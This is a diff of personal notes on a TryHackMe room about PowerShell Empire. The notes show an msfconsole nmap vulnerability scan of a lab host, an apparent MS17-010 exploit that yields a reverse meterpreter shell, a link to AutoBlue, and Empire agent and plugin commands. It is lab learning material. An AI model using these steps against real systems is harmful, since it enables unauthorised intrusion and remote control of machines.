@@ -1,6 +1,6 @@
 Website [URL](https://tryhackme.com/room/rppsempire)
 
-Powershell Empire? This is a command and control server
+Powershell Empire? This is a command and control server. This can also be another reverse shell method
 
 # Enum
 want to use `msfconsole` for this whole thing
@@ -16,7 +16,7 @@ next we will do an nmap scan
 db_nmap -A --script vuln -vv -oA Empire 10.10.159.89
 ```
 
-now that we have data inside our database we can check the open ports and services on the host. as well as vulnerabilities. 445 is open
+now that we have data inside our database we can check the open ports and services on the host. as well as vulnerabilities
 ```bash
 services
 hosts
@@ -42,6 +42,7 @@ set lhost tun0
 exploit
 ```
 
+NOTE: we can use [AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010) if metasploit keeps failing
 we get a reverse meterpreter shell since we didnt change the payload. we can do a couple of things here
 ```bash
 getuid
@@ -109,4 +110,10 @@ now that we have an agent we can run all sorts of commands and modules. lets tak
 + powershell/trollsploit/voicetroll
 
 we can also add new plugins to Empire
-simply download and transfer a plugin.py file to the /
+simply download and transfer a plugin.py file to the /plugins directory of Empire
+```bash
+./ps-empire server
+plugin <pluginName>
+start <pluginName>
+stop <pluginName>
+```
